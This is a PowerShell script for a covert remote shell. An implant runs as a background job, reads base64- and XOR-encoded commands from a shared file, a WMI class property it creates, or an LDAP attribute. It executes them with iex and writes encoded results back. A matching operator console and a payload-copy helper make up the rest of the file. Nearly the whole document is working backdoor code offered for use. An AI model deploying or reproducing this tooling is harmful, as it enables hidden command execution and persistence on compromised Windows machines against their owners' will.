function decode($data){
    [text.encoding]::Unicode.GetString([convert]::FromBase64String($data))
}

function encode($data){
    [convert]::ToBase64String([text.encoding]::Unicode.GetBytes($data))
}

function cmdfile_read($path){
    [io.file]::ReadAllText($path)
}

function cmdfile_write($path,$data){
    [io.file]::WriteAllText($path,$data)
}

function wmi_read($namespace,$class,$property){
    (New-Object Management.ManagementClass($namespace,$class,$null)).properties[$property].value
}

function xor($key,$data){
$u=[text.encoding]::unicode
$u.GetString(($u.GetBytes($data) | %{$_ -bxor $key}))
}



function wmi_write($namespace,$class,$readProperty,$writeProperty,$data){

    $obj = New-Object Management.ManagementClass($namespace,$class,$null)
    if(!$?){
        $newclass = New-Object Management.ManagementClass($namespace,$null,$null)
        $newclass.Name = $class
        $newclass.Properties.add($readProperty,'1111')
        $newclass.Properties.add($writeProperty,'2222')
        $newclass.properties[$readProperty].qualifiers.add('key',$true)
        $newclass.Put() | Out-Null
        $obj = New-Object Management.ManagementClass($namespace,$class,$null)
    }
    $obj.Properties.Add($writeProperty,$data) | Out-Null
    $obj.Put() | Out-Null
}

function ldap_read($dc,$cn,$property){
    $obj = [adsi]("LDAP://$dc"+":389/$dn")
    [string]($obj.InvokeGet($property))
}

function ldap_write($dc,$cn,$property,$data){
    $obj = [adsi]("LDAP://$dc"+":389/$cn")
    $obj.InvokeSet("LDAP://$dc"+":389/$cn",$data)
    $obj.SetInfo()
}

#fileshell example arguments
$arguments = @{'readFunction'=$Function:cmdfile_read;'readFunctionParams'=@('\\path\to\folder\i\think\wr');'writeFunction'=$Function:cmdfile_write;
            'writeFunctionParams'=@('\\path\to\folder\i\think\rd');'sleepMs'=500;'encryptFunction'=$Function:xor;'encryptFunctionParams'=@(42);
            'decryptFunction'=$Function:xor;'decryptFunctionParams'=@(42)}

#wmishell example arguments
$arguments = @{'readFunction'=$Function:wmi_read;'readFunctionParams'=@('\\.\root','goodclassname','goodpropertyread');'writeFunction'=$Function:wmi_write;
            'writeFunctionParams'=@('\\.\root','goodclassname','goodpropertyread','goodpropertywrite');'sleepMs'=500;'encryptFunction'=$null;'encryptFunctionParams'=$null;
            'decryptFunction'=$null;'decryptFunctionParams'=$null}


function init(){
start-job -ScriptBlock {
$parameters = $args[0]

#make scriptblock strings into real functions, apparently that doesn't get transferred too well into a job.
$parameters.readFunction = [scriptblock]::Create($parameters.readFunction)
$parameters.writeFunction = [scriptblock]::Create($parameters.writeFunction)
if($parameters.encryptFunction){
    $parameters.encryptFunction = [scriptblock]::Create($parameters.encryptFunction)
}
if($parameters.decryptFunction){
    $parameters.decryptFunction = [scriptblock]::Create($parameters.decryptFunction)
}

function executionloop([scriptblock]$readFunction,[array]$readFunctionParams,[scriptblock]$writeFunction,[array]$writeFunctionParams,[int]$sleepMs,[scriptblock]$encryptFunction,[array]$encryptFunctionParams,[scriptblock]$decryptFunction,[array]$decryptFunctionParams){
    $mutex = New-Object threading.mutex $false,'ExecOn_Meow1231231'
    #"waiting for mutex..."
    $mutex.WaitOne()
    #"obtained mutex"
    while(1){
        
        if($sleepMs){
            sleep -m $sleepMs
            #echo (@('loop!','woop!') | get-random) #maybe consider deleting later(probably not??)
            #$error > C:\users\public\errors
        }

        
        $readData = $readFunction.Invoke($readFunctionParams)
        
        if(($readData -eq $previousData) -or !$readData){
            
            continue
        }
        $mutex.ReleaseMutex()
        #"released mutex, executing command"
        $previousData = $readData
        $command = [text.encoding]::Unicode.GetString([convert]::FromBase64String($readData))
        if($decryptFunction){
            $command = [string]$decryptFunction.Invoke($decryptFunctionParams+($command))
        }
        $Error.Clear()
        #$command
        $result = iex $command -ErrorVariable err -OutVariable out -WarningVariable warn
        $ar = @($out,$err,$warn) 
        $rawOutput = [Management.Automation.PSSerializer]::Serialize($ar)
        
        if($encryptFunction){
            $rawOutput = [string]$encryptFunction.Invoke($encryptFunctionParams+($rawOutput))
        }
        $output = [convert]::ToBase64String([text.encoding]::Unicode.GetBytes($rawOutput))
        
        $writeFunction.Invoke($writeFunctionParams+($output))
        
        #"waiting for mutex..."
        $mutex.WaitOne()
        #"obtained mutex"
        $previousData = $readFunction.Invoke($readFunctionParams)
        
    }

}

executionloop @parameters
#$error >> C:\users\public\errors

} -ArgumentList $arguments 



}




##control functions(doesn't need to be on clients, this is just for operating the shell).
function build_copytotarget($src,$dst){
    $data = encode ([io.file]::readAllText($src))
    "[io.file]::writeAllText('$dst',[text.encoding]::Unicode.GetString([convert]::FromBase64String('$data')))"
}



function shell($readargs,$writeargs,$ms){
    while(1){
    $cmd = (Read-Host "ps>")
    
    if($cmd){
        if($cmd[0] -eq '!'){
            iex $cmd.Substring(1)
            continue
        }
        if($arguments.encryptFunction){
            $cmd = [string]$arguments.encryptFunction.Invoke($arguments.encryptFunctionParams+$cmd)
        }
        $cmd = encode $cmd
        $arguments.writeFunction.Invoke($writeargs+$cmd);
        sleep -m $ms
    }
    $data = [string]$arguments.readFunction.Invoke($readargs)
    $data = decode $data
    
    if($arguments.decryptFunction){
    $data = [string]$arguments.decryptFunction.Invoke($arguments.decryptFunctionParams + $data)
    }
    $res = [management.automation.psserializer]::Deserialize($data)
    if($res[1]){
        $res[1]
    }
    
    if($res[2]){
        $res[2]
    }
    $last= $res[0]
    $res[0]

    }
}

#fileshell example
#with the fileshell example arguments array above($arguments):
shell -readargs @('C:\users\public\nicewrite') -writeargs @('C:\users\public\myread') -ms 500
#with the wmishell example arguments array above($arguments as well!):
shell -readargs @('\\.\root','goodclassname','goodpropertywrite') -writeargs @('\\.\root','goodclassname','goodpropertywrite','goodpropertyread') -ms 500

#mgmtshell:
#shell -readargs @('\\path\to\folder\i\think\wr') -writeargs @('\\path\to\folder\i\think\rd') -ms 500